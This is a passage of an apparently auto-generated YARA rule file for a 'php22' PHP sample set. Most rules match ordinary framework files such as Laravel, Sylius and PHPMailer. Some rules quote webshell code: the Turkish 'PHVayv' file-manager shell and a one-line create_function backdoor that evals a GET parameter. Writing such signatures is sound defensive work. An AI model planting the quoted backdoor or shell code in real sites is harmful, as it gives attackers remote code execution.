      $s10 = "SZ0lWeTZaK0g0dWxBZVE5N2ZpQ2xPdmhlOFIxUDFTcEZUYnprMEdaQVpnMFZpeUhyMHlISDllSEg2TjhE" fullword ascii
      $s11 = "xWHMxSG1sbnh1enRwOW1YWHl4RHBkSmZyd2c3UjJ5dEpTT21QQlh0dGp5aDlLSXVjSHFYbVJhS0plZTFy" fullword ascii
      $s12 = "tNjRTdFA4bHAwbWpSQU0xYXgzKy9jUWVQSVNPdmg5cXRiRC9TVXlYRGlBQWljczVPWitLR0JDTENmaDVk" fullword ascii
      $s13 = "qMTRsNEZWelFzQ2k5R0hxWFJpc2h1WXZ0ZkU5aWo3R3ZQNkE0dzNQdXh5U2g4U3N4ZXhWNzlLZUIrcmtu" fullword ascii
      $s14 = "4UkQ0OEd3cDlLT1BhTTJkS2k0QnNlZjhtNDlPWjZDMVlDaUJmSTRDK3NnZ21NN3B4TjBIbWZMNFhnWWo2" fullword ascii
      $s15 = "qb2NmYzNWRHJwdEt3UGp3eEhhY0pMMDk4VzBBUTdGSWp1RkdTRUo1Zkk3eWRFV2dlOGZjS29uUHI2WCtt" fullword ascii
      $s16 = "2bWw0bXl2QWhRbTVoeXczWDJ3Q1dLaTA4MUlRUEs3em52OWJjZVNNT3p4Y3FCTkNrM1hvZEw0dllFTWVK" fullword ascii
      $s17 = "2bk9KZDhPTzZaUUF6YWxIdjNOV0F2Ri9NMS84WE9nQ2szS1ZpMXVacDZ4WHZzYmRVaDcvREwxY1ROejBu" fullword ascii
      $s18 = "TdU5xUUErN2J3K3N0TmpvcXJSVUFSZ1F2V0NlY3N6ZzM2L01OMXRmS3lrVk9qSTltWGZTdFVCNEpNS3Uy" fullword ascii
      $s19 = "heXM5QlhaTHkvaUtHaHdRV1pYTFpPa05DclFJbld4S24rTEJ1S2RzMU5HSGV0QWx0V2NkZFZGeE82RzNL" fullword ascii
      $s20 = "FWlc1MkFPZE9KUUVVQ0l5eWRuNXo5NU4vQU9ENTJnL2FVZnVkOG5jdFpSaGx2SUQzMzgzeGpsREFCN1Ja" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      8 of them
}

rule PostgresProcessor
{
   meta:
      description = "php22 - file PostgresProcessor.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f5bc51fcd8c37ac08ef8070450aec01a6ae7aafd8e16c60f325904f631ba300"
   strings:
      $s1 = "* Process an \"insert get ID\" query." fullword ascii
      $s2 = "public function processInsertGetId(Builder $query, $sql, $values, $sequence = null)" fullword ascii
      $s3 = "* Process the results of a column listing query." fullword ascii
      $s4 = "namespace Illuminate\\Database\\Query\\Processors;" fullword ascii
      $s5 = "$result = $query->getConnection()->selectFromWriteConnection($sql, $values)[0];" fullword ascii
      $s6 = "class PostgresProcessor extends Processor" fullword ascii
      $s7 = "public function processColumnListing($results)" fullword ascii
      $s8 = "* @param  \\Illuminate\\Database\\Query\\Builder  $query" fullword ascii
      $s9 = "* @param  array  $results" fullword ascii
      $s10 = "* @param  string  $sequence" fullword ascii
      $s11 = "* @param  string  $sql" fullword ascii
      $s12 = "$id = is_object($result) ? $result->{$sequence} : $result[$sequence];" fullword ascii
      $s13 = "use Illuminate\\Database\\Query\\Builder;" fullword ascii
      $s14 = "return is_numeric($id) ? (int) $id : $id;" fullword ascii
      $s15 = "return ((object) $result)->column_name;" fullword ascii
      $s16 = "return array_map(function ($result) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_Replica
{
   meta:
      description = "php22 - file Replica.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "46b0cd4f1dce3a8dada9e88c5d5ee2da76ac03f0b2d51b738075cd4b90a60a55"
   strings:
      $s1 = "* The handler gets invoked by the router. This accepts a Request" fullword ascii
      $s2 = "* Get information about a particular entry, given its hash." fullword ascii
      $s3 = "* Given a unique ID, set this object's source property to the respective" fullword ascii
      $s4 = "* Get updates to the replica since a given hash" fullword ascii
      $s5 = "* Gets the entire Blakechain." fullword ascii
      $s6 = "'description' => 'Lookup the information for the given hash in this replicated Chronicle'" fullword ascii
      $s7 = "public function getByHash(array $args = []): ResponseInterface" fullword ascii
      $s8 = "* List the latest current hash and summary hash for this replica" fullword ascii
      $s9 = "public function getLastHash(): ResponseInterface" fullword ascii
      $s10 = "* database record ID (to use in future querying)." fullword ascii
      $s11 = "'description' => 'Get information about the latest entry in this replicated Chronicle'" fullword ascii
      $s12 = "* @throws FilesystemException" fullword ascii
      $s13 = "* @package ParagonIE\\Chronicle\\Handlers" fullword ascii
      $s14 = "$lasthash = Chronicle::getDatabase()->row(" fullword ascii
      $s15 = "$record = Chronicle::getDatabase()->run(" fullword ascii
      $s16 = "* @throws HashNotFound" fullword ascii
      $s17 = "return Chronicle::getSapient()->createSignedJsonResponse(" fullword ascii
      $s18 = "$rows = Chronicle::getDatabase()->run(" fullword ascii
      $s19 = "$since = Chronicle::getDatabase()->run(" fullword ascii
      $s20 = "public function getSince(array $args = []): ResponseInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule PhoneValidator
{
   meta:
      description = "php22 - file PhoneValidator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d1f755df44f27641c95908329225a4200c0f07016526dd7bee17d2a60209091"
   strings:
      $s1 = "<coder.liu@qq.com>" fullword ascii
      $s2 = "* PhoneValidator" fullword ascii
      $s3 = "$error = $this->attributeMessage;" fullword ascii
      $s4 = "$error = \"{$this->attributeLabel}" fullword ascii
      $s5 = "if (!preg_match('/^1[34578]\\d{9}$/i', $value)) {" fullword ascii
      $s6 = "$value = $this->_attributeValue;" fullword ascii
      $s7 = "if (is_null($this->attributeMessage)) {" fullword ascii
      $s8 = "protected $_allowActions = ['type'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_Page404
{
   meta:
      description = "php22 - file Page404.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cb9708e9c855dd83a090687093c06d1b67084cb96c497fd07094cf8d8ee6123"
   strings:
      $s1 = "* @package ImpressPagegetCurrentPage" fullword ascii
      $s2 = "return ipGetOptionLang('Config.websiteTitle', null, 'Page not found');" fullword ascii
      $s3 = "public function generateContent()" fullword ascii
      $s4 = "public function getMetaTitle()" fullword ascii
      $s5 = "return 'error404';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_PH_Vayv
{
   meta:
      description = "php22 - file PH_Vayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "79ea4abb65d7a5cdaac51f044ad2ff61d9e71f75fe8f475cf360e59eece0ccea"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?php echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s3 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?php echo \"$fistik\";?>.php?sildos=<?php echo $ekinci;?>&dizin=<?php echo $dizin;?>\" style=\"text-decoration: no" fullword ascii
      $s6 = "<a href=\"<?php echo \"$fistik.php?dizin=$dizin/\" ?><?php echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<a href=\"<?php echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<a href=\"<?php echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s12 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s13 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$dizin/$duzenle\"?></font><" fullword ascii
      $s14 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s17 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s18 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s19 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s20 = "<a color=\"#9F9F9F\" target=\"_blank\" href=\"<?php echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none\"><f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule RelationNotFoundException
{
   meta:
      description = "php22 - file RelationNotFoundException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f6b16bd4b65d145dbbbfd7984e0881bea38532cb3e1f6d29f6cef3ff4710e1e"
   strings:
      $s1 = "* The name of the affected Eloquent model." fullword ascii
      $s2 = "* Create a new exception instance." fullword ascii
      $s3 = "* @param  string  $relation" fullword ascii
      $s4 = "* The name of the relation." fullword ascii
      $s5 = "* @param  mixed  $model" fullword ascii
      $s6 = "$instance = new static(\"Call to undefined relationship [{$relation}] on model [{$class}].\");" fullword ascii
      $s7 = "class RelationNotFoundException extends RuntimeException" fullword ascii
      $s8 = "namespace Illuminate\\Database\\Eloquent;" fullword ascii
      $s9 = "use RuntimeException;" fullword ascii
      $s10 = "public static function make($model, $relation)" fullword ascii
      $s11 = "$instance->relation = $relation;" fullword ascii
      $s12 = "$class = get_class($model);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule qrcode_class
{
   meta:
      description = "php22 - file qrcode.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9bd83cdbe6b00ecffee1d1f60044946dd5352f954e26fd733e91fb4dc61c35be"
   strings:
      $x1 = "* (QR Code is registered trademark of DENSO WAVE INCORPORATED | http://www.denso-wave.com/qrcode/)" fullword ascii
      $x2 = "$this->final = unpack(\"C*\", file_get_contents(dirname(__FILE__).'/data/modele'.$this->version.'.dat'));" fullword ascii
      $s3 = "$this->matrix[$this->format_information_x1[$i]][$this->format_information_y1[$i]]=$content * 255;" fullword ascii
      $s4 = "$this->matrix[$this->format_information_x2[$i+1]][$this->format_information_y2[$i+1]]=$content * 255;" fullword ascii
      $s5 = "$filename = dirname(__FILE__).\"/data/qrv\".$this->version.\"_\".$this->ec.\".dat\";" fullword ascii
      $s6 = "' '=>36,'$'=>37,'%'=>38,'*'=>39,'+'=>40,'-'=>41,'.'=>42,'/'=>43,':'=>44);" fullword ascii
      $s7 = "$rstemp=$rs_temp[$rs_block_number].str_repeat(chr(0),$this->rs_ecc_codewords);" fullword ascii
      $s8 = "$filename = dirname(__FILE__).\"/data/rsc\".$this->rs_ecc_codewords.\".dat\";" fullword ascii
      $s9 = "$this->matrix[ $this->matrix_x_array[$bit_pos] ][ $this->matrix_y_array[$bit_pos] ] = ( 255 ^ $this->mask_array[$bit_pos] );" fullword ascii
      $s10 = "$demerit_n4=floor(abs(( (100* (substr_count($ver,chr($bit_r))/($this->byte_num)) )-50)/5))*10;" fullword ascii
      $s11 = "$this->addData($this->data_val[$this->data_cur]*45+$an_hash[substr($this->value,$i,1)], 11, true);" fullword ascii
      $s12 = "$this->data_word=array_merge($this->data_word,unpack(\"C*\",$rstemp));" fullword ascii
      $s13 = "$this->data_num = $this->addData($this->length, 8); /* #version 1-9 */" fullword ascii
      $s14 = "$this->data_num = $this->addData($this->length, 10); /* #version 1-9 */" fullword ascii
      $s15 = "$this->data_num = $this->addData($this->length, 9); /* #version 1-9 */" fullword ascii
      $s16 = "public function displayPNG($w=100, $background=array(255,255,255), $color=array(0,0,0), $filename = null, $quality = 0)" fullword ascii
      $s17 = "$n3_search=chr($bit_r).chr(255).chr($bit_r).chr($bit_r).chr($bit_r).chr(255).chr($bit_r);" fullword ascii
      $s18 = "$content=substr($format_information_array[$format_information_value],$i,1);" fullword ascii
      $s19 = "* permet d'afficher le QRcode dans un pdf via FPDF" fullword ascii
      $s20 = "de \"QRcode image PHP scripts version 0.50g (C)2000-2005,Y.Swetake\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}


rule OrderTaxesApplicatorInterface
{
   meta:
      description = "php22 - file OrderTaxesApplicatorInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8a233504d9134fccdf1841e9d50e8396a84b63d8684a137329c3938ff470e712"
   strings:
      $s1 = "use Sylius\\Component\\Addressing\\Model\\ZoneInterface;" fullword ascii
      $s2 = "* @param ZoneInterface $zone" fullword ascii
      $s3 = "* @param OrderInterface $order" fullword ascii
      $s4 = "public function apply(OrderInterface $order, ZoneInterface $zone): void;" fullword ascii
      $s5 = "namespace Sylius\\Component\\Core\\Taxation\\Applicator;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RequestBasedLocaleContextSpec
{
   meta:
      description = "php22 - file RequestBasedLocaleContextSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "399bc513a49d21768fd2e0accc9336f99749edc5590cdf1f8aa4a7f9d85d8332"
   strings:
      $s1 = "$this->shouldThrow(LocaleNotFoundException::class)->during('getLocaleCode');" fullword ascii
      $s2 = "$localeProvider->getAvailableLocalesCodes()->willReturn(['pl_PL', 'de_DE']);" fullword ascii
      $s3 = "$requestStack->getMasterRequest()->willReturn($request);" fullword ascii
      $s4 = "function it_throws_locale_not_found_exception_if_master_request_locale_code_is_not_among_available_ones(" fullword ascii
      $s5 = "function it_throws_locale_not_found_exception_if_master_request_is_not_found(RequestStack $requestStack): void" fullword ascii
      $s6 = "use Symfony\\Component\\HttpFoundation\\RequestStack;" fullword ascii
      $s7 = "use Symfony\\Component\\HttpFoundation\\ParameterBag;" fullword ascii
      $s8 = "$requestStack->getMasterRequest()->willReturn(null);" fullword ascii
      $s9 = "function it_throws_locale_not_found_exception_if_master_request_does_not_have_locale_attribute(" fullword ascii
      $s10 = "use Sylius\\Component\\Locale\\Context\\LocaleNotFoundException;" fullword ascii
      $s11 = "use Sylius\\Component\\Locale\\Provider\\LocaleProviderInterface;" fullword ascii
      $s12 = "$this->getLocaleCode()->shouldReturn('pl_PL');" fullword ascii
      $s13 = "function let(RequestStack $requestStack, LocaleProviderInterface $localeProvider): void" fullword ascii
      $s14 = "use Sylius\\Component\\Locale\\Context\\LocaleContextInterface;" fullword ascii
      $s15 = "final class RequestBasedLocaleContextSpec extends ObjectBehavior" fullword ascii
      $s16 = "$request->attributes = new ParameterBag(['_locale' => 'en_US']);" fullword ascii
      $s17 = "$request->attributes = new ParameterBag(['_locale' => 'pl_PL']);" fullword ascii
      $s18 = "$this->beConstructedWith($requestStack, $localeProvider);" fullword ascii
      $s19 = "$this->shouldImplement(LocaleContextInterface::class);" fullword ascii
      $s20 = "namespace spec\\Sylius\\Bundle\\LocaleBundle\\Context;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule ProducttypesController
{
   meta:
      description = "php22 - file ProducttypesController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "54f8695949b7d1d8fa72072fe1be37ce370a8fd2fb9bb671b7cad926d8826f0a"
   strings:
      $s1 = "* Manage operations for product of types" fullword ascii
      $s2 = "$query = Criteria::fromInput($this->di, \"ProductTypes\", $this->request->getPost());" fullword ascii
      $s3 = "* Search producttype based on current criteria" fullword ascii
      $s4 = "* Shows the form to create a new producttype" fullword ascii
      $s5 = "* Saves current producttypes in screen" fullword ascii
      $s6 = "$numberPage = $this->request->getQuery(\"page\", \"int\");" fullword ascii
      $s7 = "* Edits a producttype based on its id" fullword ascii
      $s8 = "foreach ($productTypes->getMessages() as $message) {" fullword ascii
      $s9 = "foreach ($producttypes->getMessages() as $message) {" fullword ascii
      $s10 = "$this->persistent->searchParams = $query->getParams();" fullword ascii
      $s11 = "* Shows the index action" fullword ascii
      $s12 = "* Deletes a producttypes" fullword ascii
      $s13 = "* Creates a new producttype" fullword ascii
      $s14 = "* ProductTypesController" fullword ascii
      $s15 = "foreach ($form->getMessages() as $message) {" fullword ascii
      $s16 = "$this->view->page = $paginator->getPaginate();" fullword ascii
      $s17 = "$id = $this->request->getPost(\"id\", \"int\");" fullword ascii
      $s18 = "$this->flash->error(\"Product type to edit was not found\");" fullword ascii
      $s19 = "return $this->dispatcher->forward(" fullword ascii
      $s20 = "if (!$this->request->isPost()) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule QueryMapper
{
   meta:
      description = "php22 - file QueryMapper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b6c7be2a318f8692d6206081fe25da43e9e7eb812764d7015d2320a5f519bfce"
   strings:
      $s1 = "* The map method map the select query" fullword ascii
      $s2 = "* @return array[shardId][]" fullword ascii
      $s3 = "namespace Maghead\\Sharding\\QueryMapper;" fullword ascii
      $s4 = "use Maghead\\Sharding\\ShardCollection;" fullword ascii
      $s5 = "public function map(ShardCollection $shards, $query);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule OrderSpec
{
   meta:
      description = "php22 - file OrderSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "541036562c09552cccefb160982e486b04a8ea89fffeb54646837900d72a3d35"
   strings:
      $s1 = "$item2->getAdjustmentsRecursively(null)->willReturn(new ArrayCollection([$itemAdjustment2->getWrappedObject()]));" fullword ascii
      $s2 = "$orderItem->getAdjustmentsRecursively(null)->willReturn(new ArrayCollection([$itemAdjustment->getWrappedObject()]));" fullword ascii
      $s3 = "$item1->getAdjustmentsRecursively(null)->willReturn(new ArrayCollection([$itemAdjustment1->getWrappedObject()]));" fullword ascii
      $s4 = "$this->getAdjustmentsRecursively()->shouldIterateAs([$orderAdjustment, $itemAdjustment1, $itemAdjustment2]);" fullword ascii
      $s5 = "$this->getCheckoutCompletedAt()->shouldReturn($date);" fullword ascii
      $s6 = "$this->getCheckoutCompletedAt()->shouldReturn(null);" fullword ascii
      $s7 = "$orderPromotionAdjustment->getType()->willReturn('promotion');" fullword ascii
      $s8 = "$orderPromotionAdjustment->getAmount()->willReturn(420);" fullword ascii
      $s9 = "$this->getAdjustmentsTotalRecursively()->shouldReturn(15000);" fullword ascii
      $s10 = "function it_has_total_quantity(OrderItemInterface $orderItem1, OrderItemInterface $orderItem2): void" fullword ascii
      $s11 = "$orderTaxAdjustment->getAmount()->willReturn(420);" fullword ascii
      $s12 = "$this->getNotes()->shouldReturn('something squishy');" fullword ascii
      $s13 = "$orderAdjustment->getAmount()->willReturn(5000);" fullword ascii
      $s14 = "$this->getAdjustmentsTotal()->shouldReturn(6930);" fullword ascii
      $s15 = "$orderTaxAdjustment->getType()->willReturn('tax');" fullword ascii
      $s16 = "$itemAdjustment->getAmount()->willReturn(10000);" fullword ascii
      $s17 = "function it_has_checkout_completed_when_completion_date_is_set(): void" fullword ascii
      $s18 = "$orderPromotionAdjustment->setAdjustable(Argument::any())->will(function () {});" fullword ascii
      $s19 = "$orderItem2->getQuantity()->willReturn(30);" fullword ascii
      $s20 = "$orderItem1->getTotal()->willReturn(500);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule php_shell_create_function_remix
{
   meta:
      description = "php22 - file php-shell-create_function-remix.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e76a202d60664e85e08debe5d4ea01a5a533fc7f31a63e6a9461fe06edbc6d0"
   strings:
      $s1 = "$function = create_function('$code','ev'.'al'.'($_'.'GET'.'[\"code\"]);');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule php22_PHkVayv
{
   meta:
      description = "php22 - file PHkVayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c9b4a962ecc4545922cf9055fbed2b85d91ff8b7f29db40fbf903bef69f8836"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s3 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?echo \"$fistik\";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>\" style=\"text-decoration: none\">" fullword ascii
      $s6 = "<a href=\"<?echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s8 = "<a href=\"<?echo \"$fistik.php?dizin=$dizin/\" ?><?echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s12 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?echo \"$dizin/$duzenle\"?></font></td>" fullword ascii
      $s13 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s14 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s17 = "<a href=\"<?echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s18 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s19 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s20 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"<?echo \"$fistik\";?>.php?duzenle=<?echo \"$ekinci\";?>&dizin=<?echo " ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule phpmailer_lang_lt
{
   meta:
      description = "php22 - file phpmailer.lang-lt.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a1db7f9c539722a2445bf0517b931137358126fa68d7efc57a10b987c7d66dd0"
   strings:
      $s1 = "* Lithuanian PHPMailer language file: refer to English translation for definitive list" fullword ascii
      $s2 = "$PHPMAILER_LANG['connect_host']         = 'SMTP klaida: nepavyksta prisijungti prie SMTP stoties.';" fullword ascii
      $s3 = "$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP susijungimo klaida';" fullword ascii
      $s4 = "* @author Dainius Kaupaitis <dk@sum.lt>" fullword ascii
      $s5 = "$PHPMAILER_LANG['smtp_error']           = 'SMTP stoties klaida: ';" fullword ascii
      $s6 = "$PHPMAILER_LANG['recipients_failed']    = 'SMTP klaida: nepavyko i" fullword ascii
      $s7 = "$PHPMAILER_LANG['execute']              = 'Nepavyko " fullword ascii
      $s8 = "$PHPMAILER_LANG['data_not_accepted']    = 'SMTP klaida: duomenys nepriimti.';" fullword ascii
      $s9 = "$PHPMAILER_LANG['authenticate']         = 'SMTP klaida: autentifikacija nepavyko.';" fullword ascii
      $s10 = "$PHPMAILER_LANG['mailer_not_supported'] = ' pa" fullword ascii
      $s11 = "$PHPMAILER_LANG['invalid_address']      = 'Neteisingas adresas: ';" fullword ascii
      $s12 = "$PHPMAILER_LANG['provide_address']      = 'Nurodykite bent vien" fullword ascii
      $s13 = "$PHPMAILER_LANG['from_failed']          = 'Neteisingas siunt" fullword ascii
      $s14 = "$PHPMAILER_LANG['file_open']            = 'Bylos klaida: Nepavyksta atidaryti: ';" fullword ascii
      $s15 = "$PHPMAILER_LANG['instantiate']          = 'Nepavyko paleisti mail funkcijos.';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule PageConfiguration
{
   meta:
      description = "php22 - file PageConfiguration.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d24e7cca0dcc67caadb1641802951be921410f132f8466eb331ff37ebc7be51"
   strings:
      $s1 = "namespace Concrete\\Core\\Gathering\\DataSource\\Configuration;" fullword ascii
      $s2 = "public function setPageTypeID($ptID)" fullword ascii
      $s3 = "public function getPageTypeID()" fullword ascii
      $s4 = "class PageConfiguration extends Configuration" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_raw
{
   meta:
      description = "php22 - file raw.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50b51f315dad55a1931243ad1724849807c1fa7258e0083fe9c5be8c1eb29442"
   strings:
      $s1 = "* @copyright    Copyright (C) 2007 - 2012 Johan Janssens. All rights reserved." fullword ascii
      $s2 = "* @license      GNU GPLv3 <http://www.gnu.org/licenses/gpl.html>" fullword ascii
      $s3 = "* @author      Johan Janssens <johan@nooku.org>" fullword ascii
      $s4 = "* Always validates and returns the raw variable" fullword ascii
      $s5 = "* Sanitize a value" fullword ascii
      $s6 = "* Validate a value" fullword ascii
      $s7 = "$Id: raw.php 4628 2012-05-06 19:56:43Z johanjanssens $" fullword ascii
      $s8 = "* @return  bool    True when the variable is valid" fullword ascii
      $s9 = "* Raw filter" fullword ascii
      $s10 = "* @link " fullword ascii
      $s11 = "http://www.nooku.org" fullword ascii
      $s12 = "* @package     Koowa_Filter" fullword ascii
      $s13 = "* @package      Koowa_Filter" fullword ascii
      $s14 = "protected function _sanitize($value)" fullword ascii
      $s15 = "protected function _validate($value)" fullword ascii
      $s16 = "* @param   scalar  Variable to be validated" fullword ascii
      $s17 = "* @param   scalar  Variable to be sanitized" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule ReplaceWildcardVisitor
{
   meta:
      description = "php22 - file ReplaceWildcardVisitor.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "140d2731d544eb471992de1fa97ca8841cc7b24c3ce38a96a718a6cb8a6d1459"
   strings:
      $s1 = "$parentNode->appendChild($domDocument->createElement($domElement->tagName, $directory));" fullword ascii
      $s2 = "namespace Humbug\\Adapter\\Phpunit\\XmlConfiguration;" fullword ascii
      $s3 = "public function visitElement(\\DOMNode $domElement)" fullword ascii
      $s4 = "$domDocument = $domElement->ownerDocument;" fullword ascii
      $s5 = "* @var Locator" fullword ascii
      $s6 = "$directories = $this->locator->locateDirectories($domElement->nodeValue);" fullword ascii
      $s7 = "$parentNode = $domElement->parentNode;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule redis_reconnect
{
   meta:
      description = "php22 - file redis_reconnect.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf1175d8f51a2406dba4166e22af24760c749f20ee44988ffb4bee0323a2be35"
   strings:
      $s1 = "echo $php->redis->get(\"key\").\"\\n\";;" fullword ascii
      $s2 = "echo $php->redis->get(\"key\").\"\\n\";" fullword ascii
      $s3 = "require WEBPATH . '/libs/lib_config.php';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PodsAPI_CLI_Command
{
   meta:
      description = "php22 - file PodsAPI_CLI_Command.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c09f04d2a7159a5ebb73b1b84dac7a71f015252bf2cfac5a29ebe4ef1fe296e0"
   strings:
      $s1 = "WP_CLI::error( sprintf( __( 'Component %s is already not active', 'pods' ), $component ) );" fullword ascii
